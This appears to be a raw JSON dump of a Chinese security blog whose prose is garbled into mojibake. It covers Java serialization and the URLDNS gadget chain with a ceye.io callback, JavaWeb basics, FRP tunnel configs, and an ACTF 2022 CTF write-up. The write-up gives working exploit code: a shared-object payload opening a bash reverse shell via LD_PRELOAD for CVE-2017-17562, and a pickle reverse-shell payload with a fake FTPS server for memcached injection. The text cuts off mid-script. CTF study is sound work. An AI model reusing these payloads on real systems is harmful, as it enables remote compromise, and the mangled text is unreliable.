`cls.getMethods(æ–¹æ³•å,å‚æ•°èŒƒå‹)`é€šè¿‡æ–¹æ³•åè·å–è¯¥ç±»æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªMethodå¯¹è±¡\n- `med.invoke(å¯¹è±¡,ä¼ å‚)`\n\nåå°„åœ¨ååºåˆ—åŒ–ä¸­çš„åº”ç”¨\n\n- å®šåˆ¶éœ€è¦çš„å¯¹è±¡\n- é€šè¿‡invokeè°ƒç”¨é™¤åŒåå‡½æ•°ä¹‹å¤–çš„å‡½æ•°\n- é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±»\n\n### ä»£ç†\n\nä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†æ¥è®¿é—®åŸå¯¹è±¡ï¼Œæ¯”å¦‚å„ç§çš„getå’Œsetæ–¹æ³•å°±æ˜¯ä¸€ç§ä»£ç†\n\né™æ€ä»£ç†\n\n\n\n\n\n\n\n\n\nåŠ¨æ€ä»£ç†\n\néœ€è¦ä½¿ç”¨JDKä¸­çš„Proxyç±»\n\n\n\n\n\n\n\n\n\n\n\n\n\n### Javaåºåˆ—åŒ–å®ä¾‹\n\néœ€è¦å®ç°java.io.Serializableæ¥å£ï¼ˆè¯¥æ¥å£æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼‰\n\n```java\n//Person.java\npackage top.darkflow;\n\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n    public String name;\n    public int age;\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n}\n//Main.java\npackage top.darkflow;\n\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutputStream;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        Person p=new Person(\"Jlan\",18);\n        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(\"ser.ser\"));\n        objectOutputStream.writeObject(p);//åºåˆ—åŒ–è¿‡ç¨‹\n        objectOutputStream.close();\n    }\n}\n\n```\n\nä¸€äº›æ³¨æ„äº‹é¡¹\n\n- åºåˆ—åŒ–é’ˆå¯¹çš„æ˜¯å¯¹è±¡è€Œä¸æ˜¯ç±»ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–æ—¶é™æ€æˆå‘˜æ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„\n- å¦‚æœå­ç±»å®ç°äº†Serializableæ¥å£è€Œçˆ¶ç±»æ²¡æœ‰å®ç°ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–æ—¶çˆ¶ç±»å®šä¹‰çš„å†…å®¹ä¸ä¼šè¢«åºåˆ—åŒ–\n- å¦‚æœç±»ä¸­æ·»åŠ äº†transientå…³é”®å­—ï¼Œé‚£ä¹ˆè¯¥å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–\n\n```java\n//Main.java\npackage top.darkflow;\n\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(\"ser.ser\"));\n        Person p=(Person)objectInputStream.readObject();//éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢\n        System.out.println(p.name);\n        objectInputStream.close();\n    }\n}\n```\n\n- ç±»ä¸­serialVersionUIDï¼Œå¦‚æœåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ç±»çš„serialVersionUIDä¸åŒä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸\n\n### ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–é“¾\n\n**URLDNS**\n\n- è¯¥é“¾ç”±ä¸¤ä¸ªç±»ç»„æˆï¼Œåˆ†åˆ«æ˜¯HashMapå’ŒURLStreamHandlerç±»\n\n- HashMapä¸­é‡è½½äº†readObjectå‡½æ•°\n\n  ```java\n  for (int i = 0; i < mappings; i++) {\n  \t\t@SuppressWarnings(\"unchecked\")\n  \t\t\tK key = (K) s.readObject();\n  \t\t@SuppressWarnings(\"unchecked\")\n        V value = (V) s.readObject();\n      putVal(hash(key), key, value, false, false);\n  }\n  ```\n\n  æ­¤å¤„è°ƒç”¨äº†hashå‡½æ•°ï¼Œé‚£ä¹ˆå¦‚æœå…¶ä¸­æœ‰å˜é‡é‡å†™äº†hashå‡½æ•°ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½æœ‰æ¼æ´\n\n- æˆ‘ä»¬å‘ç°URLStreamHandlerç±»ä¸­çš„hashCodeå‡½æ•°è°ƒç”¨äº†`getHostAddress`æ–¹æ³•ï¼Œæ­¤å¤„å¯¹ä¼ å…¥å‚æ•°uè¿›è¡Œäº†DNSæŸ¥è¯¢ï¼Œæ­¤æ—¶ååºåˆ—åŒ–é“¾å°±æ˜æ˜¾äº†\n\n- ```\n  HashMap.readObject->URLStreamHandler.hashCode->getHostAddress\n  ```\n\n  ```java\n  public class Main {\n      public static void main(String[] args) throws IOException, ClassNotFoundException {\n          String url=\"http://kcywg9.ceye.io\";\n          URLStreamHandler handler=new SilentURLStreamHandler();\n          HashMap ht=new HashMap();\n          URL u=new URL(null,url,handler);\n          ht.put(u,url);\n          ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(\"ht.ser\"));\n          objectOutputStream.writeObject(ht);//åºåˆ—åŒ–è¿‡ç¨‹\n          objectOutputStream.close();\n      }\n      static class SilentURLStreamHandler extends URLStreamHandler{\n          SilentURLStreamHandler(){}\n          protected URLConnection openConnection(URL u) throws IOException{\n              return null;\n          }\n          protected synchronized InetAddress getHostAddress(URL u){return null;}\n      }\n  }\n  ```\n\n  \n\n","tags":["-Java"]},{"title":"JavaWebå…¥é—¨","url":"/posts/84f639f6.html","content":"\n# JavaWeb\n\n### JDBC API\n\nå¿«é€Ÿå…¥é—¨\n\n1. åˆ›å»ºå·¥ç¨‹å¯¼å…¥é©±åŠ¨jaråŒ…\n2. æ³¨å†Œé©±åŠ¨`Class.forName(\"com.mysql.jdbc.Driver\");`\n3. è·å–é“¾æ¥`Connection conn= DriverManager.getConnection(url,username,password);`\n4. å‡†å¤‡sqlè¯­å¥`String sql=\"update nnn set id=5 where id=4\";`\n5. è·å–æ‰§è¡Œsqlå¯¹è±¡Statement`Statement stmt=conn.createStatement();`\n6. æ‰§è¡Œsqlå¹¶è·å–è¿”å›å†…å®¹`int count=stmt.executeUpdate(sql);`\n7. å…³é—­é“¾æ¥`stmt.close();conn.close();`\n\n### APIè¯¦è§£\n\n##### DriverManager\n\n- é©±åŠ¨ç®¡ç†ç±»çš„ä½œç”¨\n  - æ³¨å†Œé©±åŠ¨\n  - è·å–æ•°æ®åº“çš„è¿æ¥\n- ä¸€äº›æ–¹æ³•ï¼ˆéƒ½æ˜¯é™æ€æ–¹æ³•ï¼‰\n  - `getConnection()`å°è¯•å»ºç«‹ä¸ç»™å®šæ•°æ®åº“URLçš„è¿æ¥\n    - urlï¼šjdbc:æ•°æ®åº“ç±»å‹://IP:ç«¯å£/æ•°æ®åº“åç§°?å‚æ•°\n  - `registerDriver()`æ³¨å†Œç»™å®šçš„é©±åŠ¨ç¨‹åºï¼Œä¸Šé¢mysqlä¸­çš„Driverç±»æœ¬è´¨åˆ©ç”¨çš„è¿˜æ˜¯è¿™ä¸ªå‡½æ•°\n\n##### Connection\n\n- æ•°æ®åº“è¿æ¥å¯¹è±¡çš„ä½œç”¨\n\n  - è·å–æ‰§è¡ŒSQLçš„å¯¹è±¡\n  - ç®¡ç†äº‹åŠ¡\n\n- ä¸€äº›æ–¹æ³•\n\n  - `Statement createStatement()`æ™®é€šæ‰§è¡ŒSQLå¯¹è±¡\n  - `PreparedStatement preparedStatement(sql)`é¢„ç¼–è¯‘SQLçš„æ‰§è¡ŒSQLå¯¹è±¡ï¼Œé˜²SQLæ³¨å…¥\n    - é¦–å…ˆè·å–ä¸€ä¸ªPreparedStatementå¯¹è±¡ï¼Œç„¶åSQLè¯­å¥ä¸­çš„å‚æ•°å€¼ç”¨?ä»£æ›¿å ä½\n    - è¿›è¡Œ`setxxx(å‚æ•°1,å‚æ•°2)`æ¥ç»™?èµ‹å€¼\n    - ç›´æ¥æ‰§è¡Œæ— éœ€å†æ¬¡ç©¿å‚\n\n  - MySQLäº‹åŠ¡ç®¡ç†\n  - `setAutoCommit(boolen)`trueä¸ºè‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œfalseä¸ºæ‰‹åŠ¨æäº¤äº‹åŠ¡ï¼Œå³ä¸ºå¼€å¯äº‹åŠ¡\n  - `commit()`æäº¤äº‹åŠ¡\n  - `rollback()`å›æ»šäº‹åŠ¡\n\n##### Statement\n\n- ä½œç”¨ï¼šæ‰§è¡ŒSQLè¯­å¥\n- `int executeUpdate(sql)`æ‰§è¡ŒDMLï¼ŒDDLè¯­å¥ï¼Œè¿”å›DMLè¯­å¥å½±å“çš„è¡Œæ•°ï¼ŒDDLè¯­å¥æ‰§è¡Œåï¼Œæ‰§è¡ŒæˆåŠŸä¹Ÿå¯èƒ½è¿”å›0\n- `ResultSet executeQuery(sql)`æ‰§è¡ŒDQLè¯­å¥ï¼Œè¿”å›ç»“æœé›†å¯¹è±¡\n- ResultSet\n  - `next()`å…‰æ ‡å‘åç§»ä¸€ä½å¹¶åˆ¤æ–­æ˜¯å¦æœ‰å†…å®¹\n  - `getsæ•°æ®ç±»å‹(åˆ—åæˆ–åˆ—æ•°)`è·å–å½“å‰å…‰æ ‡æŒ‡å‘çš„å†…å®¹\n\n##### æ•°æ®åº“è¿æ¥æ± \n\n- ä¸ºäº†ä¿æŒæ•°æ®åº“è¿æ¥å­˜åœ¨\n\n- ä½¿ç”¨è¿‡ç¨‹\n\n  1. å¯¼å…¥jaråŒ…\n\n  2. å®šä¹‰é…ç½®æ–‡ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹\n\n     ```\n     driverClassName=com.mysql.jc.jdbc.Driver\n     url=jdbc:mysql://127.0.0.1:3306/db1?characterEncoding=utf-8\n     username=root\n     password=123456\n     initialSize=5\n     maxActive=10\n     maxWait=5000\n     ```\n\n  3. å¯¼å…¥é…ç½®æ–‡ä»¶`Properties prop=new Properties();`\n\n     `prop.load(new FileInputStream(\"/Users/jlan/IdeaProjects/JavaWeb/jdbc-demo/src/druid.properties\"));`\n\n  4. å»ºç«‹è¿æ¥`DataSource dataSource= DruidDataSourceFactory.createDataSource(prop);`\n     `Connection connection=dataSource.getConnection();`\n\n##### Maven\n\n- Mavenæ˜¯ä¸“é—¨ç”¨äºç®¡ç†å’Œæ„å»ºJavaé¡¹ç›®çš„æ”»å‡»ï¼Œå®ƒçš„ä¸»è¦åŠŸèƒ½æœ‰\n\n  - æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„é¡¹ç›®ç»“æ„\n\n    - maven-projectâ€”â€”é¡¹ç›®åç§°\n      - srcâ€”â€”æºä»£ç å’Œæµ‹è¯•ä»£ç ç›®å½•\n        - mainâ€”â€”æºä»£ç ç›®å½•\n          - javaâ€”â€”æºä»£ç Javaæ–‡ä»¶ç›®å½•\n          - resourcesâ€”â€”æºä»£ç é…ç½®æ–‡ä»¶ç›®å½•\n          - webappâ€”â€”webé¡¹ç›®æ ¸å¿ƒç›®å½•\n        - testâ€”â€”æµ‹è¯•ä»£ç ç›®å½•\n          - javaâ€”â€”æµ‹è¯•ä»£ç Javaæ–‡ä»¶ç›®å½•\n          - resourcesâ€”â€”æµ‹è¯•ä»£ç é…ç½®æ–‡ä»¶ç›®å½•\n        - pom.xmlâ€”â€”é¡¹ç›®æ ¸å¿ƒé…ç½®æ–‡ä»¶\n\n  - æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„æ„å»ºæµç¨‹\n\n    - æ­£å¸¸æ„å»ºæµç¨‹\n      - ç¼–è¯‘ï¼Œæµ‹è¯•ï¼Œæ‰“åŒ…ï¼Œå‘å¸ƒ\n    - Mavenæä¾›ä¸€å¥—å‘½ä»¤æ¥ç®€å•æ„å»º\n\n  - æä¾›äº†ä¸€å¥—ä¾èµ–ç®¡ç†æœºåˆ¶\n\n    - æ­£å¸¸å¯¼å…¥åŒ…æµç¨‹\n\n      - ä¸‹è½½jaråŒ…\n      - å¤åˆ¶jaråŒ…åˆ°é¡¹ç›®\n      - å¯¼å…¥jaråŒ…\n\n    - Mavenå¯¼å…¥åŒ…\n\n      - æ›´æ”¹pom.xmlé…ç½®æ–‡ä»¶å³å¯ \n\n        ```\n        \n        ```\n\n        \n\n- ä½¿ç”¨Mavenæ„å»ºçš„é¡¹ç›®ç»“æ„å®Œå…¨ä¸€æ ·ï¼Œæ‰€æœ‰IDEåˆ›å»ºçš„Mavené¡¹ç›®å¯ä»¥é€šç”¨\n\n- Mavençš„ä»“åº“\n\n  - æœ¬åœ°ä»“åº“ï¼šæœ¬åœ°è®¡ç®—æœºä¸Šçš„ä¸€ä¸ªç›®å½•\n  - ä¸­å¤®ä»“åº“ï¼šç”±Mavenå›¢é˜Ÿç»´æŠ¤çš„å…¨çƒå”¯ä¸€çš„ä»“åº“\n  - è¿œç¨‹ä»“åº“ï¼šä¸€èˆ¬æ˜¯ç”±å…¬å¸æ­å»ºçš„ç§æœ‰ä»“åº“\n\n##### MyBatis\n\n- æ˜¯ä¸€æ¬¾æŒä¹…å±‚ï¼ˆè´Ÿè´£å°†æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“çš„é‚£ä¸€å±‚ä»£ç ï¼‰æ¡†æ¶ï¼Œç”¨äºç®€åŒ–JDBCå¼€å‘\n- JDBCçš„ç¼ºç‚¹ï¼šç¡¬ç¼–ç ï¼Œæ“ä½œç¹ç\n- MyBatisé€šè¿‡é…ç½®æ–‡ä»¶è§£å†³äº†ç¡¬ç¼–ç å’Œæ“ä½œç¹ççš„é—®é¢˜ï¼Œé€šè¿‡é¢„å…ˆå®šä¹‰çš„é…ç½®æ–‡ä»¶æ¥ç®€åŒ–è¿æ¥åŠå¤„ç†ç»“æœé›†çš„å·¥ä½œ\n\n##### Servlet\n\n- ç¬¬ä¸€ä¸ªç¤ºä¾‹ç¨‹åº\n\n- ```java\n  //MyFirstServlet.java\n  package top.darkflow;\n  import javax.servlet.*;\n  import java.io.IOException;\n  import java.io.PrintWriter;\n  public class MyFirstServlet implements Servlet {\n      public void init(ServletConfig config) throws ServletException {\n          System.out.println(\"Init\");\n      }\n      public void service(ServletRequest request, ServletResponse response)\n              throws ServletException, IOException {\n          System.out.println(\"From service\");\n          PrintWriter out = response.getWriter();\n          out.println(\"Hello, Java Web.\");\n      }\n      public void destroy() {\n          System.out.println(\"Destroy\");\n      }\n      public String getServletInfo() {\n          return null;\n      }\n      public ServletConfig getServletConfig() {\n          return null;\n      }\n  }\n  ```\n\n- ```xml\n  <!--web.xml-->\n  <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <web-app version=\"2.4\" xmlns=\"http://java.sun.com/xml/ns/j2ee\"\n           xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n           xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee\n  http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\">\n      <servlet>\n          <servlet-name>MyFirstServletName</servlet-name>\n          <servlet-class>com.skyline.MyFirstServlet</servlet-class>\n      </servlet>\n      <servlet-mapping>\n          <servlet-name>MyFirstServletName</servlet-name>\n          <url-pattern>/hello</url-pattern>\n      </servlet-mapping>\n  </web-app>\n  ```\n\n- Web.xmlæ–‡ä»¶çš„ä½œç”¨æ˜¯å‘Šè¯‰tomcatæˆ‘ä»¬æƒ³è¦ä½¿ç”¨å“ªä¸€ä¸ªservletæ¥å¤„ç†å¯¹åº”çš„è¯·æ±‚ï¼Œtomcaté€šè¿‡è¯¥æ–‡ä»¶æ¥æ‰¾åˆ°å¯¹åº”çš„servletæ¥å®Œæˆè¯·æ±‚åŠå“åº”çš„è¿‡ç¨‹\n\n- å°†ç”Ÿæˆçš„classæ–‡ä»¶ä»¥åŠweb.xmlæ–‡ä»¶æŒ‰ç…§ä¸‹é¢çš„ç›®å½•ç»“æ„æ”¾å…¥webappsæ–‡ä»¶å¤¹ä¸‹\n\n- ```\n  webapps\n    - MyFirstServlet\n      - WEB-INF\n        - classes\n          - top\n            - darkflow\n              - MyFirstServlet.class\n        - web.xml\n  ```\n\n- é‡å¯tomcatæœåŠ¡å¹¶è®¿é—®/MyFirstServlet/helloå°±èƒ½çœ‹åˆ°å†…å®¹å•¦\n\n##### JSP\n\n- ä»ä¸Šé¢çš„ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œç›´æ¥ä½¿ç”¨servletç”Ÿæˆç½‘é¡µï¼Œä¸ä»…ä»£ç å†™èµ·æ¥éº»çƒ¦ï¼Œå¯ç»´æŠ¤æ€§ä¹Ÿä¸é«˜ï¼Œä¸ºäº†æŠŠHTMLä¸­çš„è¿™äº›éé€»è¾‘çš„éƒ¨åˆ†æŠ½ç¦»å‡ºï¼Œæˆ‘ä»¬å¼•å…¥äº†JSPæŠ€æœ¯\n\n- JSPå…¨ç§°ä¸ºJavaServer Pagesï¼Œå¯ä»¥å°†å…¶ç†è§£æˆä¸€ç§é«˜åº¦æŠ½è±¡çš„servletï¼Œåœ¨JSPè¿è¡ŒæœŸé—´å®é™…ä¸Šä¼šè¢«ç¼–è¯‘ä¸ºservlet\n\n- ä½¿ç”¨jspæˆ‘ä»¬åªéœ€è¦åœ¨WEB-INFæ—åˆ›å»ºä¸€ä¸ªjspæ–‡ä»¶å¹¶å†™å…¥ä»£ç å³å¯\n\n- ```jsp\n  <!--test.jsp-->\n  <%@ page import=\"java.time.LocalDateTime\" %>\n  <html>\n  <body>\n  <h2>\n  <%\n  out.write(LocalDateTime.now().toString());\n  %>\n  </h2>\n  </body>\n  </html>\n  ```\n\n- æ­¤æ—¶æˆ‘ä»¬è®¿é—®/MyFirstServlet/test.jspå³å¯\n\n- ä¸€äº›è¯­æ³•\n\n  - `<% ä»£ç ç‰‡æ®µ %>`ç­‰ä»·äº`<jsp:scriptlet> ä»£ç ç‰‡æ®µ </jsp:scriptlet>`\n  - `<%! ä¸€äº›å˜é‡å£°æ˜ %>`ç­‰ä»·äº`<jsp:declaration> ä»£ç ç‰‡æ®µ </jsp:declaration>`\n\n## Servlet\n\né…ç½®æ–‡ä»¶web.xmlçš„ä¸€ä¸ªç¤ºä¾‹ï¼Œé€šè¿‡é…ç½®æ–‡ä»¶æ¥è§£æURL\n\n```xml\n<!DOCTYPE web-app PUBLIC\n        \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n        \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n    <servlet>\n        <servlet-name>downloadfile</servlet-name>\n        <servlet-class>top.darkflow.Fileget</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>downloadfile</servlet-name>\n        <url-pattern>/down</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n```\n\næ–‡ä»¶ä¸‹è½½\n\n```java\npublic class Fileget extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        String path=(\"/Users/jlan/IdeaProjects/javaweb-02-servlet/response/src/main/1.png\");\n        System.out.println(\"ä¸‹è½½æ–‡ä»¶è·¯å¾„ä¸ºï¼š\"+path);\n        String fileName=path.substring(path.lastIndexOf('/')+1);\n        resp.setHeader(\"Content-Disposition\",\"attachment:filename=\"+fileName);\n        FileInputStream in=new FileInputStream(path);\n        int len=0;\n        byte[] buffer = new byte[1024];\n        ServletOutputStream out=resp.getOutputStream();\n        while((len=in.read(buffer))>0){\n            out.write(buffer,0,len);\n        }\n        in.close();\n        out.close();\n    }\n}\n```\n\nè·å–POSTå‚æ•°\n\n```java\npublic class login extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        Enumeration<String> a=req.getParameterNames();\n        while(a.hasMoreElements()){\n            String paraName=a.nextElement();\n            System.out.println(paraName+\"=\"+req.getParameter(paraName));\n        }\n    }\n}\n```\n\n#### JSP\n\nJSPåœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šè¢«è½¬æ¢æˆä¸€ä¸ªJavaç±»\n\n```\n//åˆå§‹åŒ–\npubilc void _jspInit(){\n\n}\n//é”€æ¯\npublic void _jspDestory(){\n\n}\n//JSPService\npublic void _jspService()(HttpServletRequest request,HttpServletResponse response)\n```\n\nJSPä½œç”¨\n\nåˆ¤æ–­è¯·æ±‚\n\nå†…ç½®çš„ä¸€äº›å¯¹è±¡\n\n```java\nfinal javax.servlet.jsp.PageContext pageContext\t\t//é¡µé¢ä¸Šä¸‹æ–‡\n```\n\n# Spring\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"ä¸€äº›å°å°å·¥å…·çš„ä½¿ç”¨","url":"/posts/78e6073f.html","content":"\n## FRP\n\n<!--more -->\n\n### FRPSï¼ˆæœåŠ¡ç«¯é…ç½®ï¼‰\n\n```\n#frps.ini\n[common]\nbind_port        = 7000                # æœåŠ¡ç›‘å¬ç«¯å£\nbind_addr        = 0.0.0.0             # ç›‘å¬IP\ntoken            = 123456              # å¯†é’¥\n#ä»¥ä¸‹ä¸ºå¯é€‰å†…å®¹\ndashboard_port   = 7500                # webé¢æ¿\ndashboard_user   = admin               # é¢æ¿ç”¨æˆ·å\ndashboard_pwd    = admin               # é¢æ¿å¯†ç \nsubdomain_host   = *.darkflow.top      # WEBè®¿é—®åŸŸåç»‘å®šï¼ˆç»‘å®šååªèƒ½ç»‘å®šå­åŸŸåè®¿é—®ï¼‰\nvhost_http_port  = 10000               # webæœåŠ¡httpç«¯å£\nvhost_https_port = 10001               # webæœåŠ¡httpsç«¯å£\n```\n\n### FRPCï¼ˆå®¢æˆ·ç«¯é…ç½®ï¼‰\n\n```\n#frpc\n[common]\nserver_addr = 1.1.1.1             # æœåŠ¡å™¨IPæˆ–è€…åœ°å€\nserver_port = 7000                # æœåŠ¡å™¨æä¾›çš„ç«¯å£å·\ntoken = 123456                    # æœåŠ¡å™¨æä¾›çš„token\n#ä»¥ä¸‹ä¸ºä¸åŒæœåŠ¡é€šç”¨é…ç½®æ¨¡ç‰ˆ\n[æœåŠ¡å]\ntype = tcp                        # åè®®ç±»å‹\nlocal_ip = 127.0.0.1              # ç©¿é€çš„æœ¬åœ°åœ°å€\nlocal_port = 5001                 # ç©¿é€çš„æœ¬åœ°ç«¯å£\n[æœåŠ¡å]\ntype = http                       # åè®®ç±»å‹\nlocal_ip = 127.0.0.1              # ç©¿é€çš„æœ¬åœ°åœ°å€\nlocal_port = 80                   # ç©¿é€çš„æœ¬åœ°ç«¯å£\ncustom_domains = frp.darkflow.top # å¡«å†™ä½ çš„åŸŸå\n```\n"},{"title":"ACTF 2022","url":"/posts/1c461d7e.html","content":"\n# ACTF 2022\n\n~~å’Œå­¦é•¿ä¸€èµ·ç†¬å¤§å¤œåšä¸å‡ºæ¥é¢˜çœŸæ˜¯å¤ªçˆ½ğŸŒ¶ï¸ï¼Œä¸‹æ¬¡ç»§ç»­~~\n\n<!--more -->\n\n## gogogo\n\næ˜¯CVEï¼Œå¥½è€¶\n\n[CVE-2017-17562](https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md)\n\nå…ˆå†™å¼¹shellçš„soæ–‡ä»¶\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n__attribute__ ((__constructor__)) void aaanb(void)\n{\n    system(\"/bin/bash -c 'bash -i >& /dev/tcp/IP/ç«¯å£ 0>&1'\");\n}\n//gcc -shared -fPIC ./payload.c -o payload.so\n```\n\nå°†ç”Ÿæˆçš„soæ–‡ä»¶ä½œä¸ºæ–‡ä»¶å‘é€ï¼Œå¹¶ä¸”åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ `LD_PRELOAD=/proc/self/fd/0`ï¼Œç”±äºé¢˜ç›®æ˜¯å…¬å…±ç¯å¢ƒã€‚éœ€è¦å¯¹æœ€åæ•°å­—è¿›è¡Œçˆ†ç ´\n\n## ToLeSion\n\n~~ç†¬ä¸€æ™šä¸Šæ²¡åšå‡ºæ¥çš„é¢˜~~\n\nè¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿çš„ï¼Œå…ˆçœ‹é¢˜ï¼Œcurlè®¿é—®é“¾æ¥ï¼Œçœ‹äº†ä¸€ä¸‹å‰©ä¸‹çš„~~æˆ‘è®¤è¯†çš„~~åè®®åªæœ‰FTPSäº†ï¼Œåˆé¢˜ç›®ä¸­å†™äº†ä½¿ç”¨äº†memcachedï¼Œå¤–åŠ é¢˜ç›®ç¯å¢ƒæ˜¯pythonï¼Œæœ€ç»ˆæ‰¾åˆ°äº†[è¿™ä¸ª](https://blog.zeddyu.info/2021/05/19/tls-ctf/)ï¼Œå¤§æ¦‚æµç¨‹å°±æ˜¯é€šè¿‡TLSå¤ç”¨ï¼Œå°†payloadæ”¾åˆ°TLSè¿›è¡Œèº«ä»½è¯†åˆ«çš„SessionIDçš„ä½ç½®ï¼Œå¯¼è‡´éæ³•çš„å†…å®¹è¢«æ³¨å…¥åˆ°memcachedä¸­ï¼Œç„¶åæ›´æ”¹sessionIDå°†å®ç°pickleååºåˆ—åŒ–æ¥åå¼¹shell\n\næœ¬é¢˜å…·ä½“æµç¨‹å¦‚ä¸‹\n\n- é¦–å…ˆä¼ªé€ ä¸€ä¸ªFTPSæœåŠ¡å™¨ï¼Œå¹¶ä¸”åˆ©ç”¨ä»£ç†æ›´æ”¹TLSä¸­SessionIDä¸ºæˆ‘ä»¬çš„payload\n- åœ¨å—å®³è€…è®¿é—®æˆ‘ä»¬çš„FTPSæœåŠ¡å™¨ï¼Œé€šè¿‡è¢«åŠ¨è¿æ¥çš„æ–¹å¼å°†æ•°æ®é“¾è·¯çš„åœ°å€ç«¯å£æŒ‡å‘å—å®³è€…æœ¬åœ°çš„memcachedæœåŠ¡\n- æ­¤æ—¶å—å®³è€…å¯¹æ•°æ®é“¾è·¯è¿›è¡ŒTLSä¼šè¯å¤ç”¨ï¼Œå°†å¸¦æœ‰payloadçš„TLSå®¢æˆ·ç«¯è¯·æ±‚å‘é€åˆ°memcachedæœåŠ¡ï¼Œå¯¼è‡´memcachedå‘½ä»¤æ‰§è¡Œï¼Œå°†æˆ‘ä»¬æ„é€ çš„åºåˆ—åŒ–å†…å®¹å†™å…¥åˆ°ç›®æ ‡çš„memcachedåº“ä¸­\n- æœ€åæ›´æ”¹sessionIDå¹¶é‡æ–°è®¿é—®ç½‘é¡µï¼ŒæœåŠ¡å™¨å–å‡ºåºåˆ—åŒ–åå†…å®¹ååºåˆ—åŒ–ï¼Œåå¼¹shell\n\nOKä¸Šé¢çš„æµç¨‹éƒ½å·²ç»æ‡‚äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆå®ç°å‘¢ï¼Œé¦–å…ˆæ˜¯ä¼ªé€ æœåŠ¡å™¨ï¼ˆæ¥è‡ªå­¦é•¿çš„å®Œæ•´è„šæœ¬ï¼‰\n\n```python\nimport os\nimport pickle\nimport socketserver\nimport sys\n\nimport redis\nclass Test2(object):\n    def __reduce__(self):\n        cmd = \"bash -c 'exec bash -i &>/dev/tcp/IP/ç«¯å£ <&1'\"\n        return (os.system,(cmd,))\npickle_code=pickle.dumps(Test2())\nprint(pickle_code)\nlength=len(pickle_code)\npayload=b\"\\r\\nset actfSession:J1an 0 0 \"+str(len(pickle_code)).encode()+b\"\\r\\n\"+pickle_code+b\"\\r\\n\"\ndef set_payload(payload):\n    r = redis.Redis(host='127.0.0.1', port=6379, db=0)\n    print('payload len: ', len(payload), file=sys.stderr)\n    r.set('payload', payload)\n    return payload\n\nprint(\"è®¾ç½®çš„sessionidä¸º:\",set_payload(payload))\nprint(\"payloadé•¿åº¦ä¸º:\",len(payload))\n\n\n\n\nclass MyTCPHandler(socketserver.StreamRequestHandler):\n    def handle(self):\n        print(0,'[+] connected', self.request, file=sys.stderr)\n        self.request.sendall(b'220 (vsFTPd 3.0.3)\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(1,self.data, file=sys.stderr,flush=True)\n        self.request.sendall(b'230 Login successful.\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(2,self.data, file=sys.stderr)\n        self.request.sendall(b'227 yolo\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(3,self.data, file=sys.stderr)\n        self.request.sendall(b'227 yolo\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(4,self.data, file=sys.stderr)\n        self.request.sendall(b'257 \"/\" is the current directory\\r\\n')\n# vps:importlib/a/b\n#         self.data = self.rfile.readline().strip().decode()\n#         print(5,self.data, file=sys.stderr)\n#         self.request.sendall(b'250 Directory successfully changed.\\r\\n')\n#\n#         self.data = self.rfile.readline().strip().decode()\n#         print(6,self.data, file=sys.stderr)\n#         self.request.sendall(b'250 Directory successfully changed.\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(7,self.data, file=sys.stderr)\n        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\\r\\n')\n\n        self.data = self.rfile.readline().strip().decode()\n        print(8,self.data, file=sys.stderr)\n\n        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(9,self.data, file=sys.stderr)\n        self.request.sendall(b'200 Switching to Binary mode.\\r\\n')\n        # self.data = 